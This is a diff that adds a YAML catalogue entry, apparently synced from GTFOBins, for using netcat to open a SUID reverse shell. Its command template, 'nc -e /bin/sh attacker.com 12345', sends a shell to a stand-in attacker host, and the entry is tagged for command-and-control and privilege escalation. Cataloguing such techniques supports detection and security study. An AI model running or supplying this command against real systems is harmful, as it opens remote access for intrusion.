@@ -1,0 +1,26 @@
+id: gtfobins/nc/reverse-shell/suid
+type: binary
+platform: linux
+name: nc
+phases:
+- execution
+- command-and-control
+- privilege-escalation
+capabilities:
+- reverse-shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: nc -e /bin/sh attacker.com 12345
+  comment: This only works with netcat traditional.
+references:
+- https://gtfobins.github.io/gtfobins/nc/
+tags:
+- linux
+- unix
+- gtfobins
